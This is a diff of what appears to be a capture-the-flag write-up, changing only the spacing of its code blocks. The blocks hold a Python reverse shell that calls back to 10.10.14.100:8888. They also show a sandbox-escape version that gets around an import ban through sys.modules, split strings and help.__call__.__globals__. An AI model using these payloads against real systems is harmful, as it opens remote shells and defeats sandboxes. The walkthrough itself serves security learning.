@@ -44,22 +44,22 @@ This helped scan through [Hacktricks](https://book.hacktricks.wiki/en/generic-me
 
 I started from the following reverse shell example from [Revshells](https://revshells.com):
 ```
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.connect(("10.10.14.100",8888));
-os.dup2(s.fileno(),0);
-os.dup2(s.fileno(),1);
-os.dup2(s.fileno(),2);
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
+s.connect(("10.10.14.100", 8888));
+os.dup2(s.fileno(), 0);
+os.dup2(s.fileno(), 1);
+os.dup2(s.fileno(), 2);
 pty.spawn("sh");
 ```
 
 We can't `import`, so the interpreter doesn't know what `socket`, `os` and `pty` are. But with `sys.modules[]`, I could do this:
 ```
-socketlib=sys.modules["socket"]
-s=socketlib.socket(socketlib.AF_INET,socketlib.SOCK_STREAM);
-s.connect(("10.10.14.100",8888));
-sys.modules["o"+"s"].dup2(s.fileno(),0);
-sys.modules["o"+"s"].dup2(s.fileno(),1);
-sys.modules["o"+"s"].dup2(s.fileno(),2);
+socketlib = sys.modules["socket"]
+s = socketlib.socket(socketlib.AF_INET, socketlib.SOCK_STREAM);
+s.connect(("10.10.14.100", 8888));
+sys.modules["o"+"s"].dup2(s.fileno(), 0);
+sys.modules["o"+"s"].dup2(s.fileno(), 1);
+sys.modules["o"+"s"].dup2(s.fileno(), 2);
 sys.modules["pty"].spawn("sh");
 ```
 
@@ -132,12 +132,12 @@ So... we can access `__globals__` through something like `help.__call__`... and 
 
 Hahahahah right!
 ```
-socketlib=sys.modules["socket"]
-s=socketlib.socket(socketlib.AF_INET,socketlib.SOCK_STREAM);
-s.connect(("10.10.14.100",8888));
-sys.modules["o"+"s"].dup2(s.fileno(),0);
-sys.modules["o"+"s"].dup2(s.fileno(),1);
-sys.modules["o"+"s"].dup2(s.fileno(),2);
+socketlib = sys.modules["socket"]
+s = socketlib.socket(socketlib.AF_INET, socketlib.SOCK_STREAM);
+s.connect(("10.10.14.100", 8888));
+sys.modules["o"+"s"].dup2(s.fileno(), 0);
+sys.modules["o"+"s"].dup2(s.fileno(), 1);
+sys.modules["o"+"s"].dup2(s.fileno(), 2);
 help.__call__.__globals__['__buil'+'tins__']['__imp'+'ort__']("pty").spawn("sh");
 ```
 
